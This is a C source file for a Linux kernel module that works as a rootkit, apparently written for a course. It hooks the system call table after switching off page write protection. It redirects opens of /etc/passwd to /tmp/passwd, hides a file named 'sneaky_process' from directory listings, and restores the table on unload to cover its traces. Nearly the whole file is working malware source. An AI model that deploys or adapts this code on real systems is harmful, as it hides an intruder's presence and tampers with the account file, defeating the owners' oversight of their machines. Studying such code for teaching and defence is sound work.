#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/moduleparam.h>
#include <linux/sched.h>

#define PREFIX "sneaky_process"

//This is a pointer to the system call table
static unsigned long * sys_call_table;
static int pid = 0;
module_param(pid, int, 0);

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int (*original_getdents64)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  // Implement the sneaky part here
  const char * target_pathname = (char *)regs->si;
  if (strcmp(target_pathname, "/etc/passwd") == 0) {
    const char * replace_pathname = "/tmp/passwd";
    copy_to_user((void *)target_pathname,
                 (const void *)replace_pathname,
                 strlen(replace_pathname) + 1);  //+1 including \0
  }
  return original_openat(regs);
}

asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  int bytes_read = original_getdents64(regs);
  char * buf = (char *)regs->si;
  char * buf_end = buf + bytes_read;
  const char * target_file_name = "sneaky_process";
  struct linux_dirent64 * dirp = NULL;
  unsigned int bpos = 0;
  for (; bpos < bytes_read;) {
    dirp = (struct linux_dirent64 *)(buf + bpos);
    if (strcmp(dirp->d_name, target_file_name) == 0) {  //remove this memory
      char * source = (char *)dirp + dirp->d_reclen;
      size_t bytes_to_move = buf_end - source;
      bytes_read -= dirp->d_reclen;
      memmove(dirp, source, bytes_to_move);
    }
    else {
      bpos += dirp->d_reclen;
    }
  }
  return bytes_read;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  // You need to replace other system calls you need to hack here

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
